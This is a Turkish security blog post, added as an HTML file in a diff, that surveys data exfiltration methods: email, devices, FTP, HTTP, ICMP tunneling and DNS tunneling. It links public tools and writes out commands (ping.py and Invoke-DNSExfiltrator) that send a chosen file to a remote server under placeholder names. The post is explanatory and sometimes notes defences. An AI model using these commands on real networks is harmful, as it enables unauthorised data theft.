@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+        <title>Data Exfiltration</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css" />
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+<body>
+
+    <div class="navigation pure-menu pure-menu-horizontal">
+        <a href="/" class="pure-menu-heading  pure-menu-link">Enes Ergün | Junior of All</a>
+        <ul class="pure-menu-list">
+            <li class="pure-menu-item"></li>
+
+            <li class="pure-menu-item"><a href="/category/ansible.html" class="pure-menu-link">ansible</a></li>
+            <li class="pure-menu-item"><a href="/category/flask.html" class="pure-menu-link">flask</a></li>
+            <li class="pure-menu-item"><a href="/category/iot-elektronik.html" class="pure-menu-link">iot & elektronik</a></li>
+            <li class="pure-menu-item"><a href="/category/linux.html" class="pure-menu-link">linux</a></li>
+            <li class="pure-menu-item"><a href="/category/python.html" class="pure-menu-link">python</a></li>
+            <li class="pure-menu-item pure-menu-selected"><a href="/category/siber-guvenlik.html" class="pure-menu-link">Siber Güvenlik</a></li>
+            <li class="pure-menu-item"><a href="/category/vagrant.html" class="pure-menu-link">vagrant</a></li>
+        </ul>
+    </div>
+
+
+<div class="page-container">
+    <div class="entry-content">
+        <div class="post-meta pure-g">
+<div class="pure-u-3-4 meta-data">
+    <a href="/category/siber-guvenlik.html" class="category">Siber Güvenlik</a><br />
+
+    <a class="author" href="/author/0x656e.html">0x656e</a>
+    &mdash; <abbr title="2018-11-11T13:48:00+03:00">Sun 11 November 2018</abbr>
+</div>        </div>
+    </div>
+
+    <div class="article-header-container">
+        <div class="background-image-container">
+
+            <div class="background-image-small">
+                <div class="title-container">
+                    <h1>Data Exfiltration</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="entry-content">
+        <p><strong>Bu yazı tamamen bilgilendirme amaçlıdır.</strong></p>
+<h2>Data Exfiltration Nedir?</h2>
+<p>Bir kişi veya grubun yetkisiz bir biçimde bir veriyi başka bir bilgisayar yada sunucuya kopyalaması, transfer etmesi anlamına gelir. Data extrusion(veri çıkarma), data exportation(veri ihracati!), data theft(veri hırsızlığı) olarak da bilinir.</p>
+<p>Örnek vermek gerekirse bir banka çalışanının bankaya ait verileri bir USB(!) içerisinde dışarıya çıkartması bir suçtur. Fakat işler her zaman bu şekilde USB gibi şeyler ile de olmamaktadır. Bazen veri kaçırmayı tanımlamak çok zor hale gelebilmektedir. Farklı yöntemleri vardır.</p>
+<p>Bu yazıda sizlere yöntemlerinden kısaca bahsedeceğim.</p>
+<h2>Basit Yöntemler</h2>
+<h3>E-Posta</h3>
+<p>Aklımıza gelebilecek en kolay çözüm bir veriyi kaçırmak istersek bunu eposta ile gönderebilir ve karşı tarafta indirerek işlem tamamlanmış olabilir. Fakat burada engelleme adına Email gatewayler karşımıza çıkmaktadır. Email gatewayler temel olarak mail içerisinde zararlı var mı diye kontrol eder fakat içerisinde data kaçırmaya karşı modüllerde bulunmaktadır. Tabi burada Titus gibi yazılımlar ile birlikte datanın sınıflandırması, arkaplanda bunların loglarının tutulması da bir engel olarak görülebilir.</p>
+<p><code>Parola korumalı bir sıkıştırılmış dosyayı nasıl farkedeceklerini bilmiyorum. Ama farkedemeyeceklerini düşünüyorum.</code></p>
+<h3>Cihazlara Yüklemek</h3>
+<p>Günümüzde yanımızda bir çok akıllı cihaz taşıyoruz. Bu kısımda kurum içerisinde ki bir datayı kaçırmak isteyen kişinin telefonuna, taşınabilir diskine, laptop kullanılıyorsa bluetooth ile telefonuna atması işten bile değildir. Hatta günümüzde web.whatsapp gibi bir arayüz ile whatsapp üzerinden bile kaçırılabilir.</p>
+<p><code>Bu kısım sıkı bir takip istemekte birlikte nasıl engellenebileceği konusunda bir yorumum dahi bulunmamaktadır.</code></p>
+<h2>Teknik Yöntemler</h2>
+<p>Bu kısımda data exfiltration kısmında karşımıza bir çok yöntem çıkmakta tabi ki teknik zorlukları da bulunmaktadır. </p>
+<h3>FTP&amp;SFTP</h3>
+<p>Aslında çokta teknik olmayan bir konudur. Uzaktaki bir sunucuya FTP&amp;SFTP servis kurulur ve veriler bu servisler aracılığı ile dışarıya çıkartılabilir.</p>
+<p>Önlemek için giden trafiği inceleyecek güvenlik cihazları/yazılımları yeterli olacaktır. Trafik içerisinde gönderilen trafik boyutuda önemli bir faktördür tabi ki. Zaten çoğu güvenlik ürünü anomaly'i farkedecektir.</p>
+<h3>HTTP Methodları ile Göndermek</h3>
+<p>Bu kısımda çok teknik bir konu değildir aslında. Basit bir Web Servis yazıp bu web servise bir form koyup buradan gelecek tüm verinin arkaplanda ayrı ayrı yazıldığını düşünürseniz gayet kolaydır. Hatta çıkartılacak veriyi binary code çevirip basarsanız ve arkaplanda tekrar eski haline çevirirseniz ihtiyaçlarınızı karşılayacaktır.</p>
+<h2></h2>
+<p><strong>Asıl Bahsetmek İstediğim Kısıma Gelelim</strong></p>
+<p>Bu kısımdan önceki yazılar tamamen genel anlamda nasıl olduğundan bahsetmek amacıylaydı.</p>
+<p>Bu kısımda daha önce karşıma çıkmış olan 2 adet yöntemden bahsedeceğim, zaten yazının ana konusu bu 2 yöntemdir.</p>
+<h3>ICMP Data Exfiltration</h3>
+<p>ICMP protokolü kullanılarak yapılan yöntemdir. Yani genel anlamda bizim bildiğimiz ping komutu ile birlikte yapılan işlemlerdir. ICMP protokolü içerisinde çok fazla data veya bilgi barındırmaz basit yapıda bir protokoldür bu sebeple data exfiltration işlemleri yavaş ilerleyecektir. Kişiler ICMP Echo Requestler içerisinde göndermek istedikleri datanın binary halini atarak dışarıya veri sızdırabilmektedirler.</p>
+<p>ICMP Paketlerinin boyutu 74 bytedır. Data exfiltration kısmında genellikle 100 byte ile 542 byte arasını geçmemektedir.</p>
+<p><code>Engellemek adına yeni nesil tüm cihazlar bozuk ICMP paketlerini tespit edebilecek seviyededirler.</code></p>
+<h4>Nasıl Yapılır?</h4>
+<p><a href="https://github.com/martinoj2009/ICMPExfil">ICMPExfil</a></p>
+<p>Yukarıda vermiş olduğum linkteki araç ile ping.py ve server.py dosyaları kullanılarak bu işlem gerçekleştirilebilir.</p>
+<p><code>ping.py --ip PINGATACAGINIZSERVER --asciiFile göndereceğinizdosya</code></p>
+<h3>DNS Data Exfiltration</h3>
+<p>DNS üzerinden data exfiltration yapmaya yarar. DNS'in çalışma mantığını kullanır. 
+Nedir DNS'in çalışma mantığı?</p>
+<p>Gitmek istediğimiz bir domain'e ait olan IP'yi dünya üzerindeki veya bizim kendi networkümüzde bulunan bir DNS sunucuya sorar. DNS sunucuda kendisinde var ise bu domaine ait olan IP'yi geri döndürür ve site girmiş olursunuz, eğer yoksa sormuş olduğunuz dns servisi bir üst makama gidip root dns sunucularına sorar ve size de bu şekilde elçilik yapmış olur.</p>
+<p>Bu kısımda data exfiltration için DNS sorgusu içerisinde ki CNAME ve TXT kayıtları kullanılmaktadır. Bu sayede paket içerisine yapısal olmayan bir çok veri koyulabilmektedir. </p>
+<h4>Nasıl Yapılır</h4>
+<p><a href="https://github.com/Arno0x/DNSExfiltrator">DNS Exfiltrator</a></p>
+<p>Bu kısımda kendinize ait bir sunucunuz olması gerekmektedir. Yukarıda vermiş olduğum link içerisinden dnsefiltrator.py dosyasını belirli argümanlarla çalıştırmanız gerekmektedir. Yazılım defaultta RC4 şifreleme yapmaktadır bu sebeple argüman olarak vermiş olduğunuz parola oldukça önemlidir.</p>
+<p>Server üzerinde 
+<code>dnsexfiltrator.py -d domain -p PAROLA</code></p>
+<p>Client üzerinde</p>
+<div class="highlight"><pre><span></span>c:\DNSExfiltrator&gt; powershell
+PS c:\DNSExfiltrator&gt; Import-Module .\Invoke-DNSExfiltrator.ps1
+PS c:\DNSExfiltrator&gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
+</pre></div>
+
+
+<ul>
+<li>-i argümanı ile göndermek istediğiniz dosya </li>
+<li>-d argümanı ile server kısmında belirlemiş olduğunuz domainismi </li>
+<li>-p kısmı ile server kısmında belirtmiş olduğunuz encrytion için kullanılacak parola </li>
+<li>-s kısmında ise sunucunuzun IP adresi </li>
+<li>-t kısmında ise throttleTime yani DNS sorguları arasında geçecek süreyi girmeniz gerekmektedir.(MS)</li>
+</ul>
+<p>Dilerseniz -h parametresini kullanarak Google, CF gibi HTTP üzerinden DNS servislerinide kullanabilirsiniz.</p>
+<p>Yazıyı burada sonlandırıyorum. Daha detaylı bilgilere ulaşmak veya daha fazla teknik okumak/görmek isterseniz aşağıdaki linki kullanabilirsiniz.</p>
+<p><a href="https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/">Data Exfiltration Techniques</a></p>
+<p><strong>Burada anlatılanlar hakkında yaptığınız,yapacağınız tüm işlemlerden sizler sorumlusunuz. Mesuliyet kabul edilmemektedir.</strong></p>
+    </div>
+
+    <footer>
+        <div class="tags">
+            <a href="/tag/data-exfil.html">data exfil</a>
+            <a href="/tag/veri-kacirma.html">veri kaçırma</a>
+            <a href="/tag/veri-kacirma-yontemleri.html">veri kaçırma yöntemleri</a>
+            <a href="/tag/data-exfiltration-turkce.html">data exfiltration türkçe</a>
+            <a href="/tag/veri-guvenligi.html">veri güvenliği</a>
+        </div>
+        <div class="pure-g post-footer">
+            <div class="pure-u-1 pure-u-md-1-2">
+                <div class="pure-g poster-info">
+                    <div class="pure-u-3-4">
+                        <h3 class="author-name"><a href="/author/0x656e.html">0x656e</a></h3>
+                        <p class="author-description">
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+
+
+        </div>
+
+
+    </footer>
+
+    <div class="entry-content">
+        <div id="disqus_thread"></div>
+        <script type="text/javascript">
+            var disqus_shortname = '0x656e';
+            (function() {
+                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+    </div>
+
+</div>
+
+
+
+    <footer class="index-footer">
+
+        <a href="/" title="Enes Ergün | Junior of All">Enes Ergün | Junior of All</a>
+        <a href="/category/ansible.html">ansible</a>
+        <a href="/category/flask.html">flask</a>
+        <a href="/category/iot-elektronik.html">iot & elektronik</a>
+        <a href="/category/linux.html">linux</a>
+        <a href="/category/python.html">python</a>
+        <a href="/category/siber-guvenlik.html">Siber Güvenlik</a>
+        <a href="/category/vagrant.html">vagrant</a>
+        <a href="https://mertcangokgoz.com/">Mertcan Gökgöz</a>
+        <a href="https://onur.im/">Onur Aslan</a>
+        <a href="http://www.omeripek.com.tr/">Ömer İpek</a>
+        <a href="https://canyoupwn.me/">Canyoupwn.me</a>
+        <a href="http://www.oguzozkeroglu.com">Oğuz Özkeroğlu</a>
+        <a href="http://ahmetgurel.com">Ahmet Gürel</a>
+        <a href="https://berkimran.com.tr">Berk İmran</a>
+
+    </footer>
+
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-44262671-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+</body>
+</html>
